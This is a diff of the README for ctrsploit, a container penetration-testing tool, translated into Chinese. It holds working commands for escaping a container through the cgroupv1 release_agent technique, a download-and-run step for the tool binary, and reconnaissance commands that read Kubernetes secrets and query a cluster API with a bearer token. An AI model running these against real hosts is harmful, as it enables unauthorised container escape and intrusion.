@@ -1,9 +1,7 @@
-# ctrsploit: A penetration toolkit for container environment
+# ctrsploit: 一个容器场景自动化渗透测试工具
 
-[中文文档](./README-ZH.md)
-
-## usage
-### help
+## Usage
+### Help
 ```
 wget -O ctrsploit  && chmod +x ctrsploit
 ./ctrsploit --help
@@ -46,14 +44,14 @@ OPTIONS:
 
 ```
 
-eg. : escape by 'cgroupv1-release_agent' tech.
+例如: 使用'cgroupv1-release_agent'技术逃逸:
 ```
 root@host # docker run -ti --rm --security-opt="seccomp=unconfined" --cap-add="sys_admin" busybox
 root@ctr # wget -O ctrsploit https://nebula-pentest-tools.obs.cn-south-1.myhuaweicloud.com/ctrsploit/ctrsploit_linux_amd64 && chmod +x ctrsploit
 root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ```
 
-if we do not know the rootfs of container, ctrsploit can still escape by release agent tech
+如果我们不知道容器rootfs在宿主机上的路径，我们仍然可以完成逃逸：
 ```
 [root@container /]# ./ctrsploit e ra3 -c "cat /etc/hostname"
 INFO[0000] trying 100                                   
@@ -70,7 +68,7 @@ cce-arm-euler28-30231
 ===========end of result============== 
 ```
 
-### gather information
+### 信息收集
 usage
 ```
 root@ctr:/# ./ctrsploit env
@@ -90,7 +88,7 @@ OPTIONS:
    --help, -h  show help (default: false)
 ```
 
-where
+查看当前是否在容器内，在何容器内：
 ```
 root@ctr:/# ./ctrsploit  env  w
 INFO[0000] ===========Docker=========
@@ -108,7 +106,7 @@ cgroup contains 'kubepods': ✘
 => is in k8s: ✘ 
 ```
 
-cgroup version
+查看cgroup版本
 ```
 root@ctr:/# ./ctrsploit env c
 INFO[0000] ===========Cgroups=========
@@ -127,19 +125,19 @@ The number of devicemapper used in running container: 11 ( =(count(running conta
 The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e845b55b8c9ec42034d7d2dcc23159ebd06f3c69983e764f26eab9721/rootfs 
 ```
 
-## pre-built release
+## Pre-Built Release
 
 ## Todo List
-- [ ] env detect
-    - [ ] whether in container
-      - [ ] current container env
+- [ ] 环境探测
+    - [ ] 当前是否处于容器环境内
+      - [ ] 当前集群环境
         - [ ] swarm
         - [x] k8s
           - [x] `ls -lah /var/run/secrets/kubernetes.io`
           - [x] `cat /proc/self/mountinfo | grep hosts |grep pods`
           - [x] `cat /proc/self/cgroup |grep kubepods`
           - [x] `cat /etc/hostname`
-      - [ ] current cri
+      - [ ] 当前cri
         - [x] docker
           - [x] `ls -lah /.dockerenv`
           - [x] `head -n 1 /proc/self/mountinfo | grep docker`
@@ -148,20 +146,20 @@ The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e84
           - [x] `cat /etc/hostname` // not convinced
         - [ ] containerd
         - [ ] ...
-    - [ ] current container software version
+    - [ ] 当前容器版本探测
       - [ ] cluster api: curl -k https://10.0.0.233:5443/apis/version.cce.io/v1beta1 --header "Authorization: Bearer $token"
-    - [ ] current container ID
-    - [ ] the security protection
-        - [ ] capability
-        - [ ] seccomp
-        - [ ] LSM
+    - [ ] 当前容器完整ID
+    - [ ] 安全机制开启情况
+        - [ ] 当前容器capability
+        - [ ] 是否开启seccomp
+        - [ ] 是否开启LSM
         - [ ] cgroup
             - [ ] cgroup version
                 - [x] v1
                 - [x] v2
     - [ ] block dev name
         - [ ] /sys/block/nvme0n1
-    - [ ] the absolute path under host of container's rootfs
+    - [ ] 容器rootfs在宿主机的绝对路径
         - [ ] docker
         - [ ] k8s variant 1
         - [ ] k8s variant 2
@@ -178,7 +176,7 @@ The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e84
     - [ ] CVE-2019-16884
     - [ ] CVE-2019-14271
     - [ ] CVE-2021-21285  
-    - [ ] mount dir->symlink->mount again escape
+    - [ ] 挂载目录->软链接->再次挂载 逃逸
     - [x] cgroupv1 notify_on_release escape
         - [x] unknown rootfs support 
     - [x] cgroupv1 notify_on_release escape with unknown rootfs
